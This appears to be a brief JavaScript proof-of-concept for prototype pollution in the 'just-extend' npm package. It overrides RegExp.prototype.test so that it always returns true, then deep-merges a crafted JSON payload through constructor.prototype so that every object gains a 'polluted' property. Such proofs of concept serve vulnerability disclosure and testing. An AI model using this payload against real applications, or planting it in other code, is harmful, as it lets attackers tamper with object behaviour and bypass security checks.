RegExp.prototype.test = () => true;
const extend = require('just-extend');
let obj = {};
console.log({}.polluted);
let payload2 = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
extend(true, {}, payload2);
console.log({}.polluted);